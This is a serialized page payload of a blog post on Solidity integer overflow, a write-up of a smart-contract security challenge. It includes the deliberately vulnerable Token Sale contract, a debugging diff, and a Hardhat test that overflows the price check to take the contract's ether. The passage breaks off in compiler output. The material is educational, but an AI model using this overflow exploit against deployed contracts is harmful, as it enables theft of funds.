__NUXT_JSONP__("/posts/learning-smart-contract-security-3", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,_,$,aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al,am,an,ao,ap,aq,ar,as,at,au,av,aw,ax,ay,az,aA,aB,aC,aD,aE,aF,aG,aH,aI,aJ,aK,aL,aM,aN,aO,aP,aQ,aR,aS,aT,aU,aV,aW,aX,aY,aZ,a_,a$,ba,bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,bA,bB,bC,bD,bE,bF,bG,bH,bI,bJ,bK,bL,bM,bN,bO,bP,bQ,bR,bS,bT,bU,bV,bW,bX,bY,bZ,b_,b$,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr,cs,ct,cu,cv,cw,cx,cy,cz,cA,cB,cC,cD,cE,cF,cG,cH,cI,cJ,cK,cL,cM,cN,cO,cP,cQ,cR,cS,cT,cU,cV,cW,cX,cY,cZ,c_,c$,da,db,dc,dd,de,df,dg,dh,di,dj,dk,dl,dm,dn,do0,dp,dq,dr,ds){return {data:[{post:{slug:"learning-smart-contract-security-3",description:"Learning how maths cam be troublesome when working with Solidity",title:"Learning Smart Contract Security - Part 3",imagesource:"https:\u002F\u002Fethereum.org\u002Fassets",imagecredit:"ethereum.org",image:"2022.03.28T21:30:33_learning-smart-contract-security-3.png",createdAt:cl,updatedAt:cl,toc:[{id:cm,depth:aA,text:bv},{id:cn,depth:aA,text:bw},{id:co,depth:aA,text:bx},{id:cp,depth:aA,text:bQ},{id:cq,depth:aA,text:by},{id:cr,depth:aA,text:cs}],body:{type:"root",children:[{type:b,tag:E,props:{},children:[{type:a,value:"Continuing on "},{type:b,tag:"nuxt-link",props:{to:"\u002Fposts\u002Flearning-smart-contract-security-2"},children:[{type:a,value:"from the last article"}]},{type:a,value:", where we explored why \"private\" state variables were less than private, and how sources of randomness could be less than random in a few situations when developing Smart Contracts in Solidity, today we're going to learn how maths can be a stumbling-block in the process of ensuring our Smart Contracts' integrity."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"This article is a fair epic, so here are links to each section for your convenience:"}]},{type:a,value:m},{type:b,tag:"ol",props:{},children:[{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:ct},children:[{type:a,value:"Token Sale"}]}]},{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:cu},children:[{type:a,value:"Token Whale"}]}]},{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:cv},children:[{type:a,value:"Retirement Fund"}]}]},{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:cw},children:[{type:a,value:"Mapping"}]}]},{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:cx},children:[{type:a,value:bR}]}]},{type:a,value:m},{type:b,tag:aB,props:{},children:[{type:b,tag:T,props:{href:cy},children:[{type:a,value:"Fifty Years"}]}]},{type:a,value:m}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"And if you just want to go and check out the finished code, it's "},{type:b,tag:T,props:{href:"https:\u002F\u002Fgithub.com\u002Fn00bsys0p\u002Fvscode-devcontainer-solidity-development-environment\u002Ftree\u002F1.3.0",rel:[bd,be,bf],target:bg},children:[{type:a,value:"all available on Github"}]},{type:a,value:l}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Let's jump in..."}]},{type:a,value:m},{type:b,tag:aC,props:{id:cm},children:[{type:b,tag:T,props:{href:ct,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:bv}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Let's start out with "},{type:b,tag:T,props:{href:"learning-smart-contract-security-2"},children:[{type:a,value:"the first Math challenge - Token Sale"}]},{type:a,value:l}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002FTokenSale.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:bv}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bz}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bA}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:bh},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:"constant"}]},{type:a,value:" PRICE_PER_TOKEN "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bv}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bS},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bi}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bj}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:bk}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bl}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bB},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cz}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bT}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:bm},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:" numTokens "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bn}]},{type:a,value:cA},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:cB},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cC}]},{type:a,value:bm},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"sell"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:bm},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:aQ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:bm},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:cB},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bU}]},{type:a,value:bm},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:cD},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"numTokens "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bn}]},{type:a,value:cA},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"At first glance, it looks pretty self-explanatory - buy tokens for 1 ETH each, and sell them for the same value. Looking in a litte more depth, the thing that we first notice about this Smart Contract is the lack of bounds control on the "},{type:b,tag:o,props:{},children:[{type:a,value:"uint256 numTokens"}]},{type:a,value:" parameter on the "},{type:b,tag:o,props:{},children:[{type:a,value:bT}]},{type:a,value:" method. Because "},{type:b,tag:o,props:{},children:[{type:a,value:"1 ether"}]},{type:a,value:" is just syntactical sugar for 10"},{type:b,tag:ao,props:{},children:[{type:a,value:bo}]},{type:a,value:", and a uint256 is limited to a maximum value of 2"},{type:b,tag:ao,props:{},children:[{type:a,value:bC}]},{type:a,value:"-1, that leaves us with a potential unchecked overlap of 10"},{type:b,tag:ao,props:{},children:[{type:a,value:bo}]},{type:a,value:". Solidity "},{type:b,tag:T,props:{href:"https:\u002F\u002Fdocs.soliditylang.org\u002Fen\u002Fv0.8.0\u002F080-breaking-changes.html#silent-changes-of-the-semantics",rel:[bd,be,bf],target:bg},children:[{type:a,value:"only introduced integer over and underflow protection in v0.8.0"}]},{type:a,value:". In prior versions, and integer over or underflow wraps back through the whole range. This should means that if we pass "},{type:b,tag:o,props:{},children:[{type:a,value:"numTokens"}]},{type:a,value:" as (2"},{type:b,tag:ao,props:{},children:[{type:a,value:bC}]},{type:a,value:"\u002F10"},{type:b,tag:ao,props:{},children:[{type:a,value:bo}]},{type:a,value:")+1, we overflow the uint256 back past 0. Also notice that in this challenge, in order to pass we don't have to drain the account, we just have to reduce the balance below 1 ether. Let's try something out by adding some debug logging to the Smart Contract via "},{type:b,tag:T,props:{href:"https:\u002F\u002Fhardhat.org\u002Ftutorial\u002Fdebugging-with-hardhat-network.html#solidity-console-log",rel:[bd,be,bf],target:bg},children:[{type:a,value:"Hardhat's console.log function"}]},{type:a,value:l}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Fcontracts\u002Fmath\u002FTokenSaleChallenge.sol b\u002Fcontracts\u002Fmath\u002FTokenSaleChallenge.sol\nindex 3f8546f..3a3bcac 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:"--- a\u002Fcontracts\u002Fmath\u002FTokenSaleChallenge.sol"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:"+++ b\u002Fcontracts\u002Fmath\u002FTokenSaleChallenge.sol"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:"@@ -1,5 +1,7 @@"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"pragma solidity ^0.4.21;\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"import \"hardhat\u002Fconsole.sol\";\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"contract TokenSaleChallenge {\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    mapping(address =\u003E uint256) public balanceOf;\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    uint256 constant PRICE_PER_TOKEN = 1 ether;\n"}]},{type:a,value:"@@ -13,6 +15,7 @@ contract TokenSaleChallenge {\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    }\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    function buy(uint256 numTokens) public payable {\n"}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"        console.log(\"Overflow: %s\", numTokens * PRICE_PER_TOKEN);\n"}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"        require(msg.value == numTokens * PRICE_PER_TOKEN);\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"        balanceOf[msg.sender] += numTokens;\n"}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Now if we call the contract with our overflowed value, we'll be able to see how many Wei we need to send with the transaction in order to pass the requirement."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Ftoken-sale.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:" BigNumber "},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"ethers\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:cE}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we steal all the contract's ether\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bp}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:cE}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:br}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" buyTx "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:bV},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bT}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:cF},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bW},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bX},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:L}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"\n          BigNumber"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"ethers"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:br}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cG}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" buyTx"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Running this test with "},{type:b,tag:o,props:{},children:[{type:a,value:"npx hardhat test test\u002Fmath\u002Ftoken-sale-challenge.ts"}]},{type:a,value:" gives us the following output:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,bD]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"Compiling 1 file with 0.4.25\ncontracts\u002Fmath\u002FTokenSale.sol:9:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use \"constructor(...) { ... }\" instead.\n    function TokenSaleChallenge(address _player) public payable {\n    ^ (Relevant source part starts here and spans across multiple lines).\n\ncontracts\u002Fmath\u002FTokenSale.sol:9:33: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.\n    function TokenSaleChallenge(address _player) public payable {\n                                ^-------------^\n\nGenerating typings for: 1 artifacts in dir: typechain for target: ethers-v5\nSuccessfully generated 5 typings!\nSolidity compilation 